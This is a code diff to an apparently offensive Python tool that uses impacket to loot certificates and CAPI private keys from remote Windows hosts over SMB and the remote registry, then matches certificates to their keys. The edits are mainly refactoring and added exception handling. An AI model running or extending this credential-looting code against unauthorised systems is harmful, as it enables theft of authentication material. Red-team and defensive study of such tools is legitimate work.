@@ -83,7 +83,7 @@ class CertificatesTriage:
     def triage_system_certificates(self) -> List[Certificate]:
         logging.getLogger("impacket").disabled = True
         self.conn.enable_remoteops()
-        certificates = list()
+        certificates = []
         pkeys = self.loot_privatekeys()
         certs = self.loot_system_certificates()
         if len(pkeys) > 0 and len(certs) > 0:
@@ -94,10 +94,10 @@ class CertificatesTriage:
         my_certificates_key = 'SOFTWARE\\Microsoft\\SystemCertificates\\MY\\Certificates'
         ans = rrp.hOpenLocalMachine(self.conn.remote_ops._RemoteOperations__rrp)
         regHandle = ans['phKey']
-        certificate_keys = list()
+        certificate_keys = []
         enumerated = False
         index = 0
-        certificates = dict()
+        certificates = {}
         try:
             ans = rrp.hBaseRegOpenKey(self.conn.remote_ops._RemoteOperations__rrp, regHandle, my_certificates_key)
             keyHandle = ans['phkResult']
@@ -111,25 +111,32 @@ class CertificatesTriage:
                 index += 1
             rrp.hBaseRegCloseKey(self.conn.remote_ops._RemoteOperations__rrp, keyHandle)
             for certificate_key in certificate_keys:
-                regKey = my_certificates_key + '\\' + certificate_key
-                ans = rrp.hBaseRegOpenKey(self.conn.remote_ops._RemoteOperations__rrp, regHandle, regKey)
-                keyHandle = ans['phkResult']
-                _, certblob_bytes = rrp.hBaseRegQueryValue(self.conn.remote_ops._RemoteOperations__rrp, keyHandle, 'Blob')
-                certblob = CERTBLOB(certblob_bytes)
-
-                if certblob.der is not None:
-                    cert = self.der_to_cert(certblob.der)
-                    certificates[certificate_key] = cert
-                rrp.hBaseRegCloseKey(self.conn.remote_ops._RemoteOperations__rrp, keyHandle)
+                try:
+                    regKey = my_certificates_key + '\\' + certificate_key
+                    ans = rrp.hBaseRegOpenKey(self.conn.remote_ops._RemoteOperations__rrp, regHandle, regKey)
+                    keyHandle = ans['phkResult']
+                    _, certblob_bytes = rrp.hBaseRegQueryValue(self.conn.remote_ops._RemoteOperations__rrp, keyHandle, 'Blob')
+                    certblob = CERTBLOB(certblob_bytes)
+                    if certblob.der is not None:
+                        cert = self.der_to_cert(certblob.der)
+                        certificates[certificate_key] = cert
+                    rrp.hBaseRegCloseKey(self.conn.remote_ops._RemoteOperations__rrp, keyHandle)
+                except Exception as e:
+                    if logging.getLogger().level == logging.DEBUG:
+                        import traceback
+                        traceback.print_exc()
+                        logging.debug(str(e))
         except rrp.DCERPCSessionError as e:
             if e.error_code == 2:
                 return 'ERROR_FILE_NOT_FOUND'
-            else:
-                return e.__str__
+            elif logging.getLogger().level == logging.DEBUG:
+                    import traceback
+                    traceback.print_exc()
+                    logging.debug(str(e))
         return certificates
 
     def triage_certificates(self) -> List[Certificate]:
-        certificates = list()
+        certificates = []
         for user in self.users:
             try:
                 certificates += self.triage_certificates_for_user(user=user)                         
@@ -142,7 +149,7 @@ class CertificatesTriage:
         return certificates
 
     def triage_certificates_for_user(self, user: str) -> List[Certificate]:
-        certificates = list()
+        certificates = []
         pkeys = self.loot_privatekeys(privatekeys_paths=[elem % user for elem in self.user_capi_keys_generic_path])                         
         certs = self.loot_certificates(certificates_paths=[elem % user for elem in self.user_mycertificates_generic_path])
         if len(pkeys) > 0 and len(certs) > 0:
@@ -151,7 +158,7 @@ class CertificatesTriage:
         
 
     def loot_privatekeys(self, privatekeys_paths: List[str] = system_capi_keys_generic_path) -> Dict[str, Tuple[str,RSA.RsaKey]]:
-        pkeys = dict()
+        pkeys = {}
         pkeys_dirs = self.conn.listDirs(self.share, privatekeys_paths)
         for pkeys_path,pkeys_dir in pkeys_dirs.items():
             if pkeys_dir is not None:
@@ -175,25 +182,28 @@ class CertificatesTriage:
         return pkeys
 
     def loot_certificates(self, certificates_paths: List[str]) -> Dict[str, x509.Certificate]:
-        certificates = dict()
+        certificates = {}
         certificates_dir = self.conn.listDirs(self.share, certificates_paths)
         for cert_dir_path,cert_dir in certificates_dir.items():
             if cert_dir is not None:
                 for cert in cert_dir:
                     if cert not in self.false_positive and cert.is_directory()==0:
-                        certname = cert.get_longname()
-                        certpath = ntpath.join(cert_dir_path, certname)
-                        logging.debug("Found Certificates Blob: \\\\%s\\%s\\%s" %  (self.target.address,self.share,certpath))
-                        certbytes = self.conn.readFile(self.share, certpath)
-                        self.looted_files[certname] = certbytes
-                        certblob = CERTBLOB(certbytes)
-                        if certblob.der is not None:
-                            cert = self.der_to_cert(certblob.der)
-                            certificates[certname] = cert
+                        try:
+                            certname = cert.get_longname()
+                            certpath = ntpath.join(cert_dir_path, certname)
+                            logging.debug("Found Certificates Blob: \\\\%s\\%s\\%s" %  (self.target.address,self.share,certpath))
+                            certbytes = self.conn.readFile(self.share, certpath)
+                            self.looted_files[certname] = certbytes
+                            certblob = CERTBLOB(certbytes)
+                            if certblob.der is not None:
+                                cert = self.der_to_cert(certblob.der)
+                                certificates[certname] = cert
+                        except:
+                            pass
         return certificates
 
     def correlate_certificates_and_privatekeys(self, certs: Dict[str, x509.Certificate], private_keys: Dict[str, Tuple[str,RSA.RsaKey]], winuser: str) -> List[Certificate]:
-        certificates = list()
+        certificates = []
         for name, cert in certs.items():
             if hashlib.md5(cert.public_key().public_bytes(Encoding.DER, PublicFormat.SubjectPublicKeyInfo)).hexdigest() in private_keys.keys():
                 # Matching public and private key
